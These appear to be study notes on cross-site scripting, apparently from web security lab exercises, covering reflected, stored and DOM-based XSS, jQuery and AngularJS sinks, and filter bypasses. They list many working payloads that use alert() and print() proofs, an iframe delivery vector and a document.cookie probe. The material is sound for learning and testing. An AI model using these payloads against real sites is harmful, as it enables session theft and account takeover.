# XSS
## PoC
We can use alert() or print() functions to prove XSS attack  
XSS appears when we are able to send our JavaScript code to other clients of the website  
## Types
* Reflected - script comes from current HTTP request
* Stored - script comes from whe website's database
* DOM-based - vulnerability exists in client-side code, not in server-side

## Reflected XSS
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.  
```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```
If app responses like this:
```
<p>You searched for: gift</p>
```
In place of `gift` we will get XSS  
If another user will request this URL it will be executed on it's side  

## Stored XSS
Occurs when script passed to web-server lasts there and is sent via HTTP when other users request resource.  

## DOM-based XSS
DOM-based XSS appears when site takes attacker-controlled source and places it to dynamic code build in `eval()` or `innerHTML` functions.  
The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.  
TO inspect for DOM-based XSS we need to inspect each source of input (such as location.search) with developer tools and then inspect where output is appeared.  
Next we need to see how input is parsed and try to break it.  
We can use DOM Invader extension of Burp browser.   
Lot of DOM sinks are vulnerable to XSS. Example is `document.write()`
```
document.write('... <script>alert(document.domain)</script> ...');
```
For example, site could have search functionality and if we inspect this elemet, we see tha ti adds our input to img tag via `document.write()` function.  
We know, that img has next structure:
```
<img src="...">
```
SO we can break it with next paylaod:
```
"><svg onload=alert()>
```
If we see thar JaavaScript extracts some parameter from `location.search`, we can try to add some random parameter to URL. If it appears on page, we can put inside of it XSS.  
Example:
```
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```
### innerHTML
`innerHTML` object doesn't  support `script` or `svg` elements. So we need to use `iframe` or `img` elements.  
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
?search=<img src=1 onerror=alert()>
```

### Sources and sinks in 3rd-party dependencies
#### DOM XSS in jQuery
We need to search for sinks which modify DOM elements in jQuery. Example:  
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
Here `attr` changes href parameter. We can change page URL to make `location.search` source to contain malicious JS URL. After it `location.search` will change `back` url to our input which will result in XSS:
```
?returnUrl=javascript:alert(document.domain)
```
Another potentially vulnerable part of jQuery code is `$()` selector in conjunction with `location.hash` source.  
This is often implemented using vulnerable `hashchange` event:
```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
In this example `hash` is user-controllable and attacker could inject a XSS vector into `$()` selector
```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
`src` attribute points to vulnerable site with empty hash value. When iframe is laoded, XSS vector is appended to the hash, causing hashchange event to fire.  
Script from above must be sent to our victim  

#### DOM-XSS in AngularJS
If angular is used it could be possible toe xecute XSS without angle brackets or events. When a site uses `ng-app` attribute on HTML element, it will be processed with Angular. In such case Angular will execute JS inside double curly braces that can occur direectly in HTML or attributes.  
Example of payload:
```
{{$on.constructor('alert(1)')()}}
```

### DOM-XSS combined with reflected and stored data
Some websites could reflect information from URL to web page or form and in such case XSS could be combined (reflected and DOM-based)
```
eval('var data = "reflected string"');
```
If result is returned in JSON we can use such exploit:
```
\"-alert(1)}//
```
Sometimes stored DOM XSS could occur when website accepts request, stores it somewhere and then uses it as a response somewhere later
```
element.innerHTML = comment.author
```
Possible vector:
```
<><img src=1 onerror=alert(1)>
```
This payload is helpful when JS uses `replace()` function to validate angle brackets. But in such case it replaces only first sequence of brackets and next runs an exploit.  

## Vulnerable sinks for DOM-XSS:
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
jQuery sinks:
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## XSS contexts
When testing for XSS key task is to determine where attacker-controleld input appears and how it's validated.
Cheat-sheet for [XSS](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### XSS between HTML tags
In such case we need to provide some new HTML tags to execute JS code:
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
When site sanitizes our input, we can bypass such restriction with help of Burp Intruder and XSS cheatsheet. For example we aren't able to call some function directly with <script></script>, we can use some paylaod like this and deliver it to our victim:
```
<iframe src=https://0a8500ca04d32bb48177ee3100eb006b.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
Here we are using tag body with attributes `onresize` which executes script and onload to resize original size of iframe  
If website blocks any tag, we can use custom such as `<xss>`:
```
location=URL/search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
```
Lot of tags and all events are blocked:
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
```
"><svg><animatetransform onbegin=alert(1)>
```

### XSS in HTML tag attributes
When we commonly inject XSS between tags, we are able to close previous tag and create a new one:
```
"><script>alert(document.domain)</script>
```
But oftenly angle brackets are filtrated, but sometimes we have possibility to close atrtibute and add a new event which will trigger XSS:
```
" autofocus onfocus=alert(document.domain) x="
```
